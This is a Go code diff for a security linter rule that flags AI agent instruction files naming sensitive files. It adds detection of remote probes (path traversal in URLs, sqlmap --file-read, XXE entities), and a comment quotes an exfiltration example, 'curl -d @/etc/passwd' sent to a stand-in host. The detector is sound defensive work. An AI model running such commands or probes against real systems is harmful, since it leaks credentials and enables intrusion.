@@ -246,6 +246,27 @@ var quietGrepBeforeRe = regexp.MustCompile(`\bgrep\s+(?:-\S+\s+)*?(?:-[A-Za-z]*[
 // permission denied" in a troubleshooting table (#952).
 var errorTextAfterRe = regexp.MustCompile(`(?i)^:\s*(?:permission\s+denied|no\s+such\s+file(?:\s+or\s+directory)?|is\s+a\s+directory|not\s+a\s+directory|operation\s+not\s+permitted|read-only\s+file\s+system)\b`)
 
+// fileReadFlagRe and xmlEntityRe match what puts a path in a request to a
+// remote target: sqlmap's --file-read and an external XML entity.
+var (
+	fileReadFlagRe = regexp.MustCompile(`--file-read(?:=|\s+)['"]?$`)
+	xmlEntityRe    = regexp.MustCompile(`(?i)\bSYSTEM\s+['"]file:$`)
+)
+
+// remoteProbe reports whether the path starting at start is read on another
+// host (#966): inside a URL ("http://target/x?file=../../../etc/passwd"),
+// the argument of sqlmap's --file-read, or the file:// target of an external
+// XML entity in an XXE payload. The machine running the agent reads nothing.
+func remoteProbe(line string, start int) bool {
+	before := line[:start]
+	if fileReadFlagRe.MatchString(before) || xmlEntityRe.MatchString(before) {
+		return true
+	}
+	tok := before[strings.LastIndexAny(before, " \t\"'`(<[")+1:]
+	lower := strings.ToLower(tok)
+	return strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://")
+}
+
 // npmrcWriteRe matches a line that writes an .npmrc file, where an
 // ":_authToken" is the line being written: echo "//registry.npmjs.org/:_authToken=${{ secrets.NPM_TOKEN }}" > .npmrc.
 var npmrcWriteRe = regexp.MustCompile(`>\s*\S*\.npmrc[\w.\-]*`)
@@ -331,9 +352,19 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 			msg := src.Name + " line " + strconv.Itoa(lineNo) + " mentions the sensitive file \"" + path +
 				"\" — a trusted instruction file naming a credential/secret file is suspicious; confirm this is documentation, not an instruction to access it"
 			if pathActionRe.MatchString(actionScope(line, loc)) && !notARead(lines, i, loc, full) {
-				sev = finding.Error
-				msg = src.Name + " line " + strconv.Itoa(lineNo) + " instructs reading or sending the sensitive file \"" + path +
-					"\" — a hallmark of an exfiltration payload. Remove it"
+				switch {
+				case remoteProbe(line, loc[1]-len(full)):
+					msg = src.Name + " line " + strconv.Itoa(lineNo) + " sends a request that reads \"" + path +
+						"\" on a remote target (a URL parameter, --file-read or an XML entity) — a probe of another host, not a read of this machine; confirm the target is one the user is authorised to test"
+				case strings.EqualFold(path, "/etc/passwd") && !netExfilRe.MatchString(line):
+					// Sent to a URL it is still exfiltration: "curl -d
+					// @/etc/passwd https://x.example".
+					msg = src.Name + " line " + strconv.Itoa(lineNo) + " reads \"/etc/passwd\" — the file is world-readable and holds account names, not password hashes (those are in /etc/shadow); confirm the account list is not collected for an attack"
+				default:
+					sev = finding.Error
+					msg = src.Name + " line " + strconv.Itoa(lineNo) + " instructs reading or sending the sensitive file \"" + path +
+						"\" — a hallmark of an exfiltration payload. Remove it"
+				}
 			}
 			findings = append(findings, finding.Finding{
 				RuleID:   "CFG031",
